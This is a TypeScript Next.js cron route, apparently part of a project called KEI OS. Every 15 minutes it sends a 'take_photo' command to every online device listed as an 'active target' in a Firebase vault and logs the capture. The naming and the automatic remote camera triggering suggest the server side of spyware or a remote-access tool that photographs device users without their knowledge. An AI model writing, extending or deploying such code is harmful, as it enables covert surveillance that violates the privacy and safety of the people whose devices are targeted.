import { NextResponse } from 'next/server';
import { adminDb } from '@/lib/firebase-admin';

/**
 * KEI OS - Auto Capture Cron
 * Runs every 15 minutes to trigger camera on all online devices
 */

export async function GET(request: Request) {
  // 1. Security Check (Vercel Cron protection)
  const authHeader = request.headers.get('authorization');
  if (process.env.NODE_ENV === 'production') {
    if (authHeader !== `Bearer ${process.env.CRON_SECRET}`) {
      return new Response('Unauthorized', { status: 401 });
    }
  }

  try {
    // 2. Fetch active targets
    // Path matched with FIREBASE_PATHS.ACTIVE_TARGETS in lib/firebase.ts
    const targetsRef = adminDb.ref('kei-vault/active_targets');
    const snapshot = await targetsRef.once('value');
    const targets = snapshot.val();

    if (!targets) {
      return NextResponse.json({ message: 'No targets found in database' });
    }

    // 3. Filter online devices
    const onlineDeviceIds = Object.keys(targets).filter((id) => {
      const status = targets[id].status || '';
      return status.toUpperCase() === 'ONLINE';
    });

    if (onlineDeviceIds.length === 0) {
      return NextResponse.json({ message: 'No online targets to capture' });
    }

    // 4. Send capture command to each online device
    // Path matched with FIREBASE_PATHS.COMMANDS in lib/firebase.ts
    const commandsRef = adminDb.ref('kei-vault/commands');
    const timestamp = Date.now();
    
    const sendPromises = onlineDeviceIds.map((id) => {
      return commandsRef.child(id).push({
        action: 'take_photo',
        timestamp: timestamp,
        status: 'pending',
        type: 'auto_cron'
      });
    });

    await Promise.all(sendPromises);

    // 5. Log activity
    const logsRef = adminDb.ref('system_logs');
    await logsRef.push({
      event: 'CRON_AUTO_CAPTURE',
      details: `Triggered capture for ${onlineDeviceIds.length} devices`,
      timestamp: timestamp,
      level: 'info'
    });

    return NextResponse.json({
      success: true,
      message: `Auto-capture triggered for ${onlineDeviceIds.length} devices`,
      devices: onlineDeviceIds
    });

  } catch (error: any) {
    console.error('Cron Error:', error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
